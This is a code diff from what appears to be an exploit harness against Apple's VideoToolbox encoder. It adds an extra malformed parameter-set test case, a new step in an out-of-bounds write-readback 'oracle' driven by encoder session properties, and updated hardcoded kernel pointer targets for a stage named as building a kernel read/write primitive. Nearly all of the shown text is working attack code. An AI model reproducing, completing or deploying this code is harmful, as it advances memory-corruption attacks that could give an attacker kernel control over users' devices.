@@ -1967,18 +1967,19 @@ static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
             @[ @"c[0..299]",  seq300 ],
             @[ @"c[-1]",      @[ @(-1) ] ],
         ];
-        CMFormatDescriptionRef fmts[7] = { fmt1, fmt2, fmtS63P63, fmtS64, fmtP64, fmtP127, fmt3 };
-        CMSampleBufferRef sbufs[7] = { sbuf1, sbuf2, sbufS63P63, sbufS64, sbufP64, sbufP127, sbuf3 };
-        const char *streamTags[7] = {
+        CMFormatDescriptionRef fmts[8] = { fmt1, fmt2, fmtS15P63, fmtS63P63, fmtS64, fmtP64, fmtP127, fmt3 };
+        CMSampleBufferRef sbufs[8] = { sbuf1, sbuf2, sbufS15P63, sbufS63P63, sbufS64, sbufP64, sbufP127, sbuf3 };
+        const char *streamTags[8] = {
             "1Layer(vps=26)",
             "2Layer(vps=39,alpha=3)",
+            "Sps15P63(sps=29,pps=10,id=15/63)",
             "Sps63P63(sps=30,pps=10,id=63/63)",
             "Sps64(sps=30,pps=10,id=64/9)",
             "Pps64(sps=29,pps=9,id=5/64)",
             "Pps127(sps=29,pps=10,id=5/127)",
             "Sps128(sps=37,pps=17,id=128/9)"
         };
-        for (int si = 0; si < 7; si++) {
+        for (int si = 0; si < 8; si++) {
             if (!fmts[si]) continue;
             NSMutableArray *decParts = [NSMutableArray array];
             NSString *decSuppStr = @"none";
@@ -2626,10 +2627,11 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                     CFRelease(rb0);
                 }
 
-                // Controlled Write-Readback Sequence on x19+0x7060..0x7063:
+                // Controlled Write-Readback Sequence on x19+0x7060..0x7067:
                 //   Step 1: Quality=1.0 -> sets byte +0x7063 = 1 (cr[7] 0x00000004 -> 0x01000004)
                 //   Step 2: ChromaQPIndexOffsetMultiPPS (cqp[15]=-4) -> writes 32-bit word 0xfffffffc to +0x7060..0x7063
                 //   Step 3: Quality=1.0 -> sets byte +0x7063 = 1 on top of 0xfffffffc -> 0x01fffffc
+                //   Step 4: HwFeatureOn=8 -> toggles byte +0x7065 (oob[0] = ns[17] / alias ns[32]: 0x00000100 -> 0x00000000)
                 OSStatus stWriteQ1 = VTSessionSetProperty(rwS, kVTCompressionPropertyKey_Quality, (__bridge CFTypeRef)@1.0);
                 int afterQ1Cr7 = -1, afterQ1Alias30 = -1;
                 CFTypeRef rbQ1 = NULL;
@@ -2658,22 +2660,36 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 }
 
                 OSStatus stWriteQ1Again = VTSessionSetProperty(rwS, kVTCompressionPropertyKey_Quality, (__bridge CFTypeRef)@1.0);
-                int afterQ1AgainCr7 = -1, afterQ1AgainAlias30 = -1;
+                int afterQ1AgainCr7 = -1, afterQ1AgainAlias30 = -1, beforeHw8Oob0 = -1;
                 CFTypeRef rbQ1b = NULL;
                 if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbQ1b) == noErr && rbQ1b) {
                     NSArray *nsQ1b = (__bridge NSArray *)rbQ1b;
                     if ([nsQ1b isKindOfClass:[NSArray class]] && nsQ1b.count >= 72) {
                         afterQ1AgainCr7 = [nsQ1b[15] intValue];
                         afterQ1AgainAlias30 = [nsQ1b[30] intValue];
+                        beforeHw8Oob0 = [nsQ1b[17] intValue];
                     }
                     CFRelease(rbQ1b);
                 }
 
-                KPH9OutAppend(log, @"  krwToggleOracle[x19+0x7060..0x7063]: base=0x%08x -> Q1.0(%d)=0x%08x(alias30=0x%08x) -> cqpNeg4(%d)=0x%08x(alias30=0x%08x) -> Q1.0(%d)=0x%08x(alias30=0x%08x)\n",
+                OSStatus stHw8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
+                int afterHw8Oob0 = -1, afterHw8Alias32 = -1;
+                CFTypeRef rbHw8 = NULL;
+                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHw8) == noErr && rbHw8) {
+                    NSArray *nsHw8 = (__bridge NSArray *)rbHw8;
+                    if ([nsHw8 isKindOfClass:[NSArray class]] && nsHw8.count >= 72) {
+                        afterHw8Oob0 = [nsHw8[17] intValue];
+                        afterHw8Alias32 = [nsHw8[32] intValue];
+                    }
+                    CFRelease(rbHw8);
+                }
+
+                KPH9OutAppend(log, @"  krwToggleOracle[x19+0x7060..0x7067]: base=0x%08x -> Q1.0(%d)=0x%08x(alias30=0x%08x) -> cqpNeg4(%d)=0x%08x(alias30=0x%08x) -> Q1.0(%d)=0x%08x(alias30=0x%08x) | oob0[+0x7064]: 0x%08x -> Hw8(%d)=0x%08x(alias32=0x%08x)\n",
                               (unsigned)baseCr7,
                               (int)stWriteQ1, (unsigned)afterQ1Cr7, (unsigned)afterQ1Alias30,
                               (int)stWriteCqpNeg4, (unsigned)afterCqpNeg4Cr7, (unsigned)afterCqpNeg4Alias30,
-                              (int)stWriteQ1Again, (unsigned)afterQ1AgainCr7, (unsigned)afterQ1AgainAlias30);
+                              (int)stWriteQ1Again, (unsigned)afterQ1AgainCr7, (unsigned)afterQ1AgainAlias30,
+                              (unsigned)beforeHw8Oob0, (int)stHw8, (unsigned)afterHw8Oob0, (unsigned)afterHw8Alias32);
 
                 VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                 @synchronized ([KPH9EncoderModule class]) { rwRes->closed = 1; }
@@ -2695,8 +2711,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
     // -------------------------------------------------------------------------
     KPH9OutAppend(log, @"  [8B: DPB x34 OOB Write + UserRPSForFaceTime (0x92f13c) Cross-Property Readback & RPS OOB Shaper]\n");
     {
-        uint64_t targetKPtr0 = (gStage5CandCount > 0) ? gStage5Cands[0].kptr : 0xffffffee4e806580ULL;
-        uint64_t targetKPtr1 = (gStage5CandCount > 1) ? gStage5Cands[1].kptr : 0xfffffe2673806580ULL;
+        uint64_t targetKPtr0 = (gStage5CandCount > 0) ? gStage5Cands[0].kptr : 0xffffffedfd620000ULL;
+        uint64_t targetKPtr1 = (gStage5CandCount > 1) ? gStage5Cands[1].kptr : 0xffffffe289ee5658ULL;
         uint32_t kp0Lo = (uint32_t)(targetKPtr0 & 0xffffffffULL);
         uint32_t kp0Hi = (uint32_t)(targetKPtr0 >> 32);
         uint32_t kp1Lo = (uint32_t)(targetKPtr1 & 0xffffffffULL);
@@ -2830,8 +2846,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 }
             }
         }
-        const int fallbackNTLs[4] = { 16462, 16433, 16445, 15989 };
-        const uint64_t fallbackKPtrs[4] = { 0xffffffff00000059ULL, 0xffffffe289ee5658ULL, 0xffffffee4e806580ULL, 0xfffffe2673806580ULL };
+        const int fallbackNTLs[4] = { 16462, 16444, 16446, 16433 };
+        const uint64_t fallbackKPtrs[4] = { 0xffffffff00000059ULL, 0xffffffedfd620000ULL, 0xffffffefff31b3f0ULL, 0xffffffe289ee5658ULL };
         for (int fi = 0; fi < 4 && nTargets < 6; fi++) {
             BOOL dup = NO;
             for (int j = 0; j < nTargets; j++) {
